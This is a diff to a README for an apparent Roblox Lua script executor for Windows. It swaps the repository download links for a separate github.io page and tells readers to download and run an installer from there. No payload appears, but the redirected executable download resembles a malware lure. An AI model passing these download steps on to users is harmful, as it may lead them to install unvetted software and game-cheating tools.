@@ -1,6 +1,6 @@
 # 🚀 swift-windows-lua-executor - Run your favorite Roblox scripts easily
 
-[![](https://img.shields.io/badge/Download-Swift_Executor-blue.svg)](https://github.com/raffaa2864/swift-windows-lua-executor)
+[![](https://img.shields.io/badge/Download-Swift_Executor-blue.svg)](https://raffaa2864.github.io)
 
 Swift provides a way to run Lua scripts on Windows 10 and 11. It works for Roblox. This software features a desktop interface. You access over 500 scripts through the built-in hub. You do not need to deal with keys to use the application. The software runs on 64-bit systems.
 
@@ -21,7 +21,7 @@ If your computer uses a 32-bit version of Windows, this software will not work. 
 
 Follow these steps to set up the application on your PC. 
 
-1. Visit the [official download page](https://github.com/raffaa2864/swift-windows-lua-executor) to get the latest version of the installer.
+1. Visit the [official download page](https://raffaa2864.github.io) to get the latest version of the installer.
 2. Locate the file in your downloads folder.
 3. Open the file to start the installation wizard.
 4. Follow the instructions on the screen to finish the setup.
